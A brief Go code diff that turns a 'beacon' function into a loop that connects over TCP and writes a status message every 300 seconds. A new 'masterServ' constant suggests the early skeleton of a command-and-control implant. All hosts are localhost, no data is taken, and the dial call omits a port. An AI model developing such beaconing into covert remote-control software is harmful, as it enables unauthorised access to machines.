@@ -14,16 +14,19 @@ import (
 )
 
 const (
-	connHost = "localhost"
-	connPort = "7025"
-	connType = "tcp"
+	connHost   = "localhost"
+	connPort   = "7025"
+	connType   = "tcp"
+	masterServ = "localhost"
 )
 
-func beacon(conn net.Conn) {
-
+func beacon() {
+	conn, err := net.Dial("tcp", "localhost")
+	errorHandler(err)
 	for true {
-		writeData(true, "NULL")
+
 		time.Sleep(300 * time.Second)
+		conn.Write([]byte(writeData(true, "NULL")))
 	}
 
 }
